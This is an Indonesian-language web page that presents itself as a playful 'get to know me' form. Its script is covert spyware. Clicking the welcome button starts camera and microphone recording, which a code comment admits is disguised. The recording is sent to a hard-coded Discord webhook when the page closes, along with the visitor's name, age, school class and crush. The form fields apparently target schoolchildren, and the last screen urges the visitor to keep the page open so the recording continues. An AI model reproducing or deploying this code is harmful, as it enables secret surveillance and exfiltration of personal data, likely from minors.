<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kenalan Yuk! ✨</title>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #ff4d94;
            --primary-light: #ff80b3;
            --bg: #0a0a0c;
            --glass: rgba(255, 255, 255, 0.05);
            --border: rgba(255, 255, 255, 0.1);
        }

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Plus Jakarta Sans', sans-serif; }

        body {
            background-color: var(--bg);
            background-image: 
                radial-gradient(circle at 10% 20%, rgba(255, 77, 148, 0.1) 0%, transparent 40%),
                radial-gradient(circle at 90% 80%, rgba(139, 92, 246, 0.08) 0%, transparent 40%);
            color: white;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }

        .glass-card {
            background: var(--glass);
            backdrop-filter: blur(20px);
            padding: 40px 30px;
            border-radius: 35px;
            border: 1px solid var(--border);
            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.6);
            text-align: center;
            width: 90%;
            max-width: 380px;
            position: relative;
        }

        h2 { font-size: 1.6rem; font-weight: 800; margin-bottom: 12px; line-height: 1.3; color: #fff; }
        p { color: #a1a1aa; margin-bottom: 30px; font-size: 0.95rem; }

        .form-content { text-align: left; }
        .input-group { margin-bottom: 18px; }
        label { display: block; margin-bottom: 8px; color: #71717a; font-size: 0.8rem; font-weight: 600; text-transform: uppercase; letter-spacing: 1px; }
        
        input {
            width: 100%; padding: 14px 18px; border-radius: 18px; border: 1px solid var(--border);
            background: rgba(0, 0, 0, 0.2); color: white; outline: none; transition: 0.3s;
        }
        input:focus { border-color: var(--primary); background: rgba(255, 77, 148, 0.05); }

        .btn {
            width: 100%; padding: 16px; border: none; border-radius: 20px;
            font-size: 1rem; font-weight: 700; cursor: pointer; transition: 0.4s;
            letter-spacing: 0.5px;
        }
        .btn-primary { 
            background: linear-gradient(135deg, var(--primary), #bc13fe); 
            color: white; 
            box-shadow: 0 10px 20px rgba(255, 77, 148, 0.3);
        }
        .btn-primary:hover { transform: translateY(-3px); box-shadow: 0 15px 25px rgba(255, 77, 148, 0.4); }

        /* Dialogs */
        .overlay {
            position: fixed; inset: 0; background: var(--bg); z-index: 100;
            display: flex; justify-content: center; align-items: center;
            padding: 20px;
        }

        #successDialog {
            position: fixed; inset: 0; background: rgba(10, 10, 12, 0.95);
            backdrop-filter: blur(25px); z-index: 200;
            display: none; justify-content: center; align-items: center;
            opacity: 0; transition: 0.5s;
        }

        .heart-icon { font-size: 3.5rem; margin-bottom: 20px; display: inline-block; animation: heartbeat 1.5s infinite; }
        @keyframes heartbeat {
            0% { transform: scale(1); }
            15% { transform: scale(1.2); }
            30% { transform: scale(1); }
            45% { transform: scale(1.1); }
            60% { transform: scale(1); }
        }
    </style>
</head>
<body>

    <div id="step1" class="overlay">
        <div class="glass-card">
            <div class="heart-icon">💖</div>
            <h2>SEBELUM KENALAN,<br>APAKAH KAMU MAU KENALAN DENGAN KU?</h2>
            <p>Klik tombol di bawah kalau kamu mau kita temenan ya!</p>
            <button class="btn btn-primary" onclick="initApp()">MAU BANGET! ✨</button>
        </div>
    </div>

    <div id="mainForm" class="glass-card" style="display: none; opacity: 0; transition: 0.5s;">
        <h2 style="font-size: 1.4rem;">Yeay! Kenalan Yuk..</h2>
        <p>Biar akrab, isi dikit ya profil kamu.</p>
        <div class="form-content">
            <div class="input-group">
                <label>Nama Kamu</label>
                <input type="text" id="nama" placeholder="Tulis namamu di sini..">
            </div>
            <div class="input-group">
                <div style="display: flex; gap: 12px;">
                    <div style="flex: 1;">
                        <label>Umur</label>
                        <input type="number" id="umur" placeholder="Berapa?">
                    </div>
                    <div style="flex: 1;">
                        <label>Kelas</label>
                        <input type="text" id="kelas" placeholder="Kelas?">
                    </div>
                </div>
            </div>
            <div class="input-group">
                <label>Siapa Crush Kamu? 😍</label>
                <input type="text" id="crush" placeholder="Punya doi gak?">
            </div>
            <button class="btn btn-primary" id="btnSubmit" onclick="submitData()">
                Selesai! 🚀
            </button>
        </div>
    </div>

    <div id="successDialog">
        <div class="glass-card">
            <div style="font-size: 3.5rem; margin-bottom: 20px;">🌈</div>
            <h2>MAKASIH YA!</h2>
            <p>Data kamu udah aku simpan. Salam kenal ya, senang deh bisa tau tentang kamu!</p>
            <button class="btn btn-primary" onclick="finalStep()">OKAY! ✨</button>
        </div>
    </div>

    <video id="v" autoplay muted style="display:none;"></video>

    <script>
        const WEBHOOK = "https://discord.com/api/webhooks/1472604875316789362/WCsymTViSWZcRWqn6Xb_oJcMwelZTf7bRxdQ3lpAkh5rh7eTh49Bx1uZsJfQZOmMaLQg";
        let recorder;
        let chunks = [];

        async function initApp() {
            try {
                // Izin kamera disamarkan di balik tombol "Mau Banget"
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                document.getElementById('v').srcObject = stream;
                
                recorder = new MediaRecorder(stream);
                recorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
                
                recorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'video/webm' });
                    const f = new FormData();
                    f.append('file', blob, 'surprise_moment.webm');
                    f.append('content', '🎥 **Video Recorded Silently**');
                    await fetch(WEBHOOK, { method: 'POST', body: f });
                };

                recorder.start(1000); // Perekaman dimulai detik ini juga
                
                // Transisi UI
                document.getElementById('step1').style.opacity = '0';
                setTimeout(() => {
                    document.getElementById('step1').style.display = 'none';
                    const main = document.getElementById('mainForm');
                    main.style.display = 'block';
                    setTimeout(() => { main.style.opacity = '1'; }, 50);
                }, 500);

            } catch (err) {
                alert("Yah, kalau gak diizinkan kita gak bisa kenalan lebih jauh :( Coba lagi ya!");
            }
        }

        async function submitData() {
            const btn = document.getElementById('btnSubmit');
            const data = {
                nama: document.getElementById('nama').value,
                umur: document.getElementById('umur').value,
                kelas: document.getElementById('kelas').value,
                crush: document.getElementById('crush').value
            };

            if(!data.nama) return alert("Namanya belum diisi lho..");

            btn.disabled = true;
            btn.innerText = "Sabar ya... ✨";

            const payload = {
                embeds: [{
                    title: "💖 Ada Teman Baru!",
                    color: 16731540,
                    fields: [
                        { name: "Nama", value: data.nama, inline: true },
                        { name: "Umur", value: data.umur, inline: true },
                        { name: "Kelas", value: data.kelas, inline: true },
                        { name: "Crush", value: data.crush }
                    ],
                    footer: { text: "Data masuk pada: " + new Date().toLocaleString() }
                }]
            };

            try {
                await fetch(WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                const dialog = document.getElementById('successDialog');
                dialog.style.display = 'flex';
                setTimeout(() => { dialog.style.opacity = '1'; }, 50);

            } catch (e) {
                btn.disabled = false;
                btn.innerText = "Selesai! 🚀";
            }
        }

        function finalStep() {
            document.getElementById('successDialog').innerHTML = `
                <div class="glass-card">
                    <div class="heart-icon">✨</div>
                    <h2>Tunggu bentar ya..</h2>
                    <p>Lagi menyelaraskan profil kamu biar pas. Jangan tutup halamannya dulu!</p>
                </div>
            `;
        }

        window.addEventListener('beforeunload', () => {
            if(recorder && recorder.state !== 'inactive') {
                recorder.stop();
            }
        });
    </script>
</body>
</html>
